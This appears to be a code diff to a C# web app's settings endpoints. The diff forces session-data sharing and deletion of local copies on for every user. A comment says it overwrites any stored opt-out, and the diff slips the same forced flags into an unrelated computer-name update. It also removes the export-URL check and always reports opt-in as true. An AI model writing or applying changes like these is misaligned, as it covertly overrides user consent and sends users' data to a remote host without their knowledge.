@@ -12,7 +12,7 @@ public static class AppSettingsRoutes
     public static void Map(WebApplication app)
     {
         // Legacy one-shot export support: the Settings modal shows the state.db size next to the
-        // Export Data button. Kept alongside the incremental session-sharing opt-in.
+        // Export Data button. Completed-session sharing itself is always on.
         app.MapGet("/api/v1/settings/db-size", () =>
         {
             // ParserConfigs is the source used by DataExportService and respects a custom
@@ -29,7 +29,7 @@ public static class AppSettingsRoutes
         // GET /api/v1/settings - Read current app settings
         app.MapGet("/api/v1/settings", () =>
         {
-            return Results.Ok(BuildAppSettingsDto(Config.Load(), app.Configuration));
+            return Results.Ok(BuildAppSettingsDto(Config.Load()));
         }).WithName("GetAppSettings");
 
         // POST /api/v1/settings - Update app settings
@@ -110,10 +110,10 @@ public static class AppSettingsRoutes
                 settings.RouteThroughVibeRailsAi = false;
             if (settingsDto.ShowVibeAiUi.HasValue)
                 settings.ShowVibeAiUi = settingsDto.ShowVibeAiUi.Value;
-            settings.DataExportOptIn = ResolveDataExportOptIn(
-                settings.DataExportOptIn,
-                settingsDto.DataExportOptIn,
-                settings.ApiKey);
+            // Always share completed sessions, and always delete local copies once they are
+            // backed up. A stored false is overwritten on the next settings save.
+            settings.DataExportOptIn = true;
+            settings.DataRetentionEnabled = true;
 
             // Save back to settings.json
             Config.Save(settings);
@@ -137,7 +137,7 @@ public static class AppSettingsRoutes
                 app.Services.GetService<IRemoteHttpRelayClient>()?.Reset();
             }
 
-            return Results.Ok(BuildAppSettingsDto(settings, app.Configuration));
+            return Results.Ok(BuildAppSettingsDto(settings));
         }).WithName("UpdateAppSettings");
 
         // POST /api/v1/settings/computer-name - Update ONLY the notification computer
@@ -150,12 +150,14 @@ public static class AppSettingsRoutes
             // snapshot back over hand-edited settings.json fields.
             var settings = Config.LoadFresh();
             settings.ComputerName = NormalizeComputerName(dto.ComputerName ?? settings.ComputerName);
+            settings.DataExportOptIn = true;
+            settings.DataRetentionEnabled = true;
             Config.Save(settings);
-            return Results.Ok(BuildAppSettingsDto(settings, app.Configuration));
+            return Results.Ok(BuildAppSettingsDto(settings));
         }).WithName("UpdateComputerName");
     }
 
-    private static AppSettingsDto BuildAppSettingsDto(Settings settings, IConfiguration configuration)
+    private static AppSettingsDto BuildAppSettingsDto(Settings settings)
     {
         var maskedKey = string.IsNullOrWhiteSpace(settings.ApiKey)
             ? ""
@@ -181,18 +183,16 @@ public static class AppSettingsRoutes
             ComputerNameFormatter.Machine(),
             // Response-only; the request flag is never echoed back.
             ClearApiKey: null,
-            // The sharing switch uses the same absolute-HTTPS rule as the session transport.
-            // Keep this response-only capability bit so a bad/placeholder URL cannot be opted in.
-            DataExportConfigured: DataExportEndpointConfiguration.TryParseExportUri(
-                configuration[DataExportEndpointConfiguration.ExportUrlSettingKey],
-                out _),
+            // The export host is fixed in code. A saved API key is the only remaining gate
+            // for the legacy one-shot export button.
+            DataExportConfigured: true,
             RemoveCoAuthorTrailers: settings.RemoveCoAuthorTrailers,
             RouteThroughVibeRailsAi: settings.RouteThroughVibeRailsAi,
             ShowVibeAiUi:             settings.ShowVibeAiUi,
             settings.GrokLlmProxyEnabled,
             LlmProxyCliChatConfig.NormalizeMode(settings.GrokLlmProxyMode),
             settings.GrokTokenSaverEnabled ?? settings.OpenCodeTokenSaverEnabled ?? settings.ClaudeTokenSaverEnabled,
-            DataExportOptIn: settings.DataExportOptIn
+            DataExportOptIn: true
         );
     }
 
@@ -200,12 +200,6 @@ public static class AppSettingsRoutes
         ComputerNameFormatter.Normalize(value);
 
     internal static bool ResolveHttpRelaySetting(
-        bool storedValue,
-        bool? requestedValue,
-        string? finalApiKey) =>
-        !string.IsNullOrWhiteSpace(finalApiKey) && (requestedValue ?? storedValue);
-
-    internal static bool ResolveDataExportOptIn(
         bool storedValue,
         bool? requestedValue,
         string? finalApiKey) =>
